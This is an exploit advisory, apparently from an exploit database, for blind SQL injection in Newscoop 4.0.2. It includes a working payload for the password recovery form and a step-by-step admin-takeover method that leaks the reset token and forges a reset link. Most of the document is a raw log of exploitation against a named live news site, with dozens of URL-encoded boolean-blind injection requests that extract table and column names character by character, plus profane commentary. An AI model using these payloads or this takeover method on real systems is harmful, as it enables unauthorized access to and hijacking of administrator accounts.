@@ -1,0 +1,1462 @@
+id: 19875
+date: 12/03/2012
+title: Newscoop 4.0.2 Blind SQLi & Path Disclosure Vulnerabilities
+author: AkaStep
+cves: 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm AkaStep member from Inj3ct0r Team                  1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+================================================================================
+Vulnerable Software: Newscoop 4.0.2
+Official site: sourcefabric.org
+Vulnerabilities: Blind SQLi & Path Disclosure
+Condition to exploit this vulnerability: GPC must be set OFF.
+Discovered by: AkaStep && KASIB_OGLAN
+================================================================================
+
+About vulns:
+
+
+
+
+Demo:  http://newscoop-demo.sourcefabric.org/admin/password_recovery.php
+
+
+Payload:
+' or sleep(10)-- and 9='9@you.owned
+
+====================SHORT WAY TO GAIN ACCESS===================================
+
+I discovered 2 SQL injection vulnerabilities in this script.
+Using the example(below) i fetched SHA1 password of admin.
+Then after 4-5 hours bruteforce/dictionary attack against that hash i found that i can't crack it A.S.A.P.
+
+Then i found another BLIND SQLi in /admin/password_recovery.php  (vulnerable parameter: f_email)
+
+After searching table_name/structure on google i found that it is CMS Called Newscoop)
+What is funny i found a bit "short way" how to exploit this vuln and gain access to this cms without password crack)
+
+Steps:
+1 ) Using BLIND SQLi obtain admin username
+2 ) Using Blind SQLi obtain admin email address (yes! we need it too)
+3 ) Then trigger password reset condition(we need generate new token but in *unusual* way.(see 3A))
+3A) What is funny since our password reset "triggering" input is malformed
+in ex:
+
+karen.sargsyan@gmail.com'-- and 9!='9karen.sargsyan@gmail.com               <=Only once!!
+
+
+CMS's @mailout() function will fail to deliver information about token/password request to admin email))( We are still hidden :)
+
+4 ) Using BLIND SQli obtain token from database( You need to obtain 50 symbols )
+In ex:
+
+Payload:
+
+f_post_sent=1&f_email=karen.sargsyan@gmail.com' and (select if(substr(password_reset_token,15,1)='1',sleep(18000),0) from liveuser_users where id=1 limit 1)-- and 1!='@sikdir and 9='9&Login=Recover+password
+
+
+
+And notice i'm using here sleep().(Time Based way)
+This is Neccessary. On server side this'll  "sleep" mysql query execution.(Or query execution automatically will be killed)
+This prevents another *new* token generation for us.
+
+Finally after obtaining all this information (after verifying too) you have to create your password reset link)
+
+Something like this:
+
+http://tv.am/admin/password_check_token.php?token=f36baafc13c4be1690bd8e4deeb4314865debbcf1354545783&f_email=karen.sargsyan@gmail.com
+
+
+You will be prompted to set new password for admin))
+
+Set your password for admin and Enjoy))))))
+
+Below is real exploitation example.
+
+
+
+I'm not responsible for any damage if the target site !='.am'
+
+
+
+=========================================================================================
+
+
+
+
+
+
+
+http://tv.am/hy/armeniannews/schedule%27%20or%20sleep%2810%29--%20and%209=%279/
+
+LoooL
+
+
+
+http://tv.am/hy/armeniannews/schedule%27%20union%20select%201,2,3,4,5,6,7,8,9%20limit%201%20OFFSET%201--%20and%209=%279
+
+
+
+http://tv.am/hy/armeniannews/schedules%27%20union%20select%20version%28%29,version%28%29,version%28%29,version%28%29,version%28%29,version%28%29,version%28%29,version%28%29,version%28%29%20limit%201%20OFFSET%200--%20and%209=%279
+(When using union way you will get HTTP STATUS CODE =not found=)
+So, union is not best choise and in this case it didn't worked for me anymore)
+
+Full Blind.
+
+
+tv.am/hy/armeniannews/schedule' and (select if(5=5,1,0))-- and 9='9
+
+
+Metod:
+
+
+False halinda qaytaracaq:
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%285=0,1,0%29%29--%20and%209=%279
+
+Sorry, the requested page was not found.
+
+
+TRUE halinda: normal sehife.
+
+ne deyirem... Sikek!!!
+
+>
+
+Simvolu eynile <
+
+Cox ehtimalki htmlspecialchars() dan kecir.Filtrdeyik.
+
+
+Ok!!!
+
+2 table_name var ki bunlarin her birinde password adli column var
+===============================================
+//TRUE
+2-de.
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28count%28table_name%29=%272%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%29--%20and%209=%279
+
+
+Sozu geden table-lardan 1-cisinin adi 14 ssimvoldur.
+
+//TrUE
+offset 0 -da
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28length%28table_name%29=%2714%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+===============================================
+
+
+O biri table -in adi ise 12 simvol uzunluqdadir.
+
+//TRUE
+offset 1
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28length%28table_name%29=%2712%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+
+12 simvol
+===============================================
+AMSconte</a>&nbps;v 1.1    the content management system developed by AM Systems for <strong>h2</strong> Armenian Second TV Channel.
+
+
+
+
+
+
+1-ci table-in adini yigaq:
+
+===============================================
+1-ci simvol:   l
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,1,1%29=%27l%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+2-ci simvol:  i
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,2,1%29=%27i%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+3-cu simvol:  v
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,3,1%29=%27v%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+4-cu simvol:   e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,4,1%29=%27e%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+5-ci simvol:   u
+
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,5,1%29=%27u%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+
+6-ci simvol:  s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,6,1%29=%27s%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+===============================================
+hal hazirda: liveus*
+
+
+7-ci simvol:   e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,7,1%29=%27e%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+8-ci simvol:        r
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,8,1%29=%27r%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+9-cu simvol: _  (prefix)
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,9,1%29=%27_%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+hal hazirda table_name=  liveuser_
+===============================================
+
+10-cu simvol:  u
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,10,1%29=%27u%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+11-ci simvol:  s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,11,1%29=%27s%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+12-ci simvol:   e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,12,1%29=%27e%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+13-cu simvol:        r
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,13,1%29=%27r%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+14-cu simvol:        s
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,14,1%29=%27s%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+===============================================
+
+1-ci table_name = liveuser_users
+
+
+mysql> select length('liveuser_users') \g
++--------------------------+
+| length('liveuser_users') |
++--------------------------+
+|                       14 |
++--------------------------+
+1 row in set (0.02 sec)
+
+
+Ok.
+
+
+
+
+
+
+
+
+
+===============2 CI TABLE_NAME UCUN==============
+
+
+mysql> select substr('liveuser_',1,9) \g
++-------------------------+
+| substr('liveuser_',1,9) |
++-------------------------+
+| liveuser_               |
++-------------------------+
+1 row in set (0.00 sec)
+
+
+
+False-dir ve table_prefix bawqadir.
+
+
+
+
+=====2 CI TABLE_NAME UCUN=(cemi length(table)=12 =offset 1==
+
+1-ci simvol: p
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,1,1%29=%27p%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+
+===============================================
+2-ci simvol:     h
+
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,2,1%29=%27h%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+===============================================
+
+3-cu simvol:   o
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,3,1%29=%27o%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+
+===============================================
+4-cu simvol:   r
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,4,1%29=%27r%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+
+
+===============================================
+
+5-ci simvol:   u
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,5,1%29=%27u%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+
+
+===============================================
+
+6-ci simvol:  m
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,6,1%29=%27m%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+===============================================
+
+7-c simvol:  _  (prefix yene de)
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,7,1%29=%27_%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+
+===============================================
+
+8-ci simvol:    u
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,8,1%29=%27u%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+===============================================
+
+9-cu simvol:    s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,9,1%29=%27s%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+===============================================
+
+10-cu simvol:   e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,10,1%29=%27e%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+===============================================
+
+11-ci simvol:       r
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,11,1%29=%27r%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+
+===============================================
+
+12-ci simvol:        s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,12,1%29=%27s%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%201%29--%20and%209=%279
+
+===============================================
+
+
+
+
+===============================================
+
+
+
+
+===============================================
+
+1-ci table_name true!
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28table_name=%27liveuser_users%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27password%27%20limit%201%20offset%200%29--%20and%209=%279
+
+
+Bu sikilmisde cox user var.
+
+
+
+===============================================
+
+
+
+
+
+
+
+2-ci table_name  phorum_users
+
+
+
+
+//TRUE
+Basqa database yoxdur bizde.
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28count%28table_schema%29=%270%27,1,0%29%20from%20information_schema.tables%20where%20table_schema!=database%28%29%20and%20table_schema!=0x696E666F726D6174696F6E5F736368656D61%29--%20and%209=%279
+0
+
+
+Tapmaq lazimdir adminkaya cavabdeh table-i.
+
+
+
+
+Demeli veziyyet beledir.
+
+username
+
+ve user_name adli columnlar var hardasa.Qalib say sec elemek.
+
+
+
+//TRUE
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28count%28table_name%29=%271%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%29--%20and%209=%279
+
+
+
+
+
+Yeah))
+
+//TRUE
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28count%28table_name%29=%271%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+Demeli basqa table varimizdir cox ehtimalki ele adminkaya cavabdeh budur!.
+
+
+Yoxlayaq sonra cekek gorek basimiza ne gelir.
+
+
+19 simvolludur bu table_name!!!!
+//TRUE
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28length%28table_name%29=%2719%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+
+Cekek tez.
+
+
+
+=========SUBHELI TABLE-IN=================
+
+1-ci simvol:   p
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,1,1%29=%27p%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+
+==========================================
+2-ci simvol:     l
+
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,2,1%29=%27l%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+
+==========================================
+
+3-cu simvol:   u
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,3,1%29=%27u%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+==========================================
+4-cu simvol:    g
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,4,1%29=%27g%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+==========================================
+
+5-ci simvol: i
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,5,1%29=%27i%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+==========================================
+
+6-ci simvol:    n
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,6,1%29=%27n%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+
+==========================================
+
+7-ci simvol:      _  (prefix)
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,7,1%29=%27_%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+==========================================
+
+8-ci simvol:  b
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,8,1%29=%27b%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+==========================================
+
+9-cu simvol:   l
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,9,1%29=%27l%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+==========================================
+
+10-cu simvol: o
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,10,1%29=%27o%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+
+==========================================
+11-ci simvol:   g
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,11,1%29=%27g%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+==========================================
+
+12-ci simvol:      _
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,12,1%29=%27_%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+
+==========================================
+
+13-cu simvol:  c
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,13,1%29=%27c%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+==========================================
+14-cu simvol:   o
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,14,1%29=%27o%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+
+==========================================
+15-ci simvol:   m
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,15,1%29=%27m%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+=========================================
+16-ci simvol: m
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,16,1%29=%27m%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+=========================================
+
+17-ci simvol:   e
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,17,1%29=%27e%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+=========================================
+
+18-ci simvol:  n
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,18,1%29=%27n%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+==========================================
+19-cu simvol:  t
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,19,1%29=%27t%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27user_name%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+==========================================
+
+plugin_blog_comment
+
+Icini sikim hec bu da admin table-a oxsamir.
+
+
+
+Bele cetin olacaq 2-ci variant adminkaya girisde email vasitesile parolun berpasi var.
+email columu axtaraq.
+
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28count%28table_name%29=%272%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+TRUE 2 verir.
+2 table var burda.
+1-ci yeqinki sikilmis subscribe ucundur.
+2-ci si ise evvel axir admin table olmalidire oyani buyani yoxdur.
+
+
+//TRUE
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28count%28table_name%29=%272%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%29--%20and%209=%279
+
+
+
+
+Burda da true-dir .
+
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28count%28table_name%29=%272%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%29--%20and%209=%279
+
+
+
+
+
+
+
+Yene de 2 verir.
+Demeli bu tapmadigimiz hansisa table(-lardir).
+
+http://tv.am/hy/armeniannews/schedule' and (select if(count(table_name)='2',1,0) from information_schema.columns where table_schema=database() and column_name='email' and table_name!='liveuser_users' and table_name!='phorum_users' and table_name!='plugin_blog_comment')-- and 9='9
+
+
+
+
+
+
+========================================
+
+Hemin bu table name 7 simvolludur.
+
+Cekek naxuy blin.
+
+//TRUE
+offset 0
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28length%28table_name%29=%277%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%200%29--%20and%209=%279
+
+========================================
+1-ci simvol:  a
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,1,1%29=%27a%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%200%29--%20and%209=%279
+
+
+========================================
+2-ci simvol:    u
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,2,1%29=%27u%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%200%29--%20and%209=%279
+
+========================================
+3-cu simvol:    t
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,3,1%29=%27t%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%200%29--%20and%209=%279
+========================================
+
+4-cu simvol:      h
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,4,1%29=%27h%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%200%29--%20and%209=%279
+
+auhtors?
+
+============================================
+
+5-ci simvol:  o
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,5,1%29=%27o%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%200%29--%20and%209=%279
+============================================
+
+6-ci simvol: r
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,6,1%29=%27r%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%200%29--%20and%209=%279
+
+============================================
+
+7-ci simvol:  s
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28substr%28table_name,7,1%29=%27s%27,1,0%29%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20column_name=%27email%27%20and%20table_name!=%27liveuser_users%27%20and%20table_name!=%27phorum_users%27%20and%20table_name!=%27plugin_blog_comment%27%20limit%201%20offset%200%29--%20and%209=%279
+============================================
+
+Oz aramizdi bu table ola biler.Mentiqnen xeber saytinda xeberi yerlesdiren kimdir? Muellif yani admin.?
+
+Her ehtimal ucun o biri table-name-i cekek sonrabirlikde yoxlanislar edek.
+
+
+Oba!!!
+
+http://code.sourcefabric.org/rdiff/newscoop?csid=c99c712f9d62cf39709ffc4ff0d49ac545900ba3&u&N
+
+https://www.google.az/search?q=b2d716fb2328a246e8285f47b1500ebcb349c187&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a
+
+
+Demeli liveuser_users dedir admin.
+
+
+
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28count%28%60password%60%29!=%270%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+http://tv.am/hy/armeniannews/schedule' and (select if(count(`password`)!='0',1,0) from liveuser_users where id=1)-- and 9='9
+
+
+Pis xeberler burda parol sha1 sifrelenme iledir.
+
+
+//TRUE
+http://tv.am/hy/armeniannews/schedule%27%20and%20%28select%20if%28length%28%60password%60%29=%2740%27,1,0%29%20from%20liveuser_users%20where%20id=1%29--%20and%209=%279
+
+
+Cekek getsin naxuy.
+
+
+
+
+
+
+
+2-ci table ise 15 simvolludur.
+Cekek getsin bu sikilmisi de.
+
+//TRUE
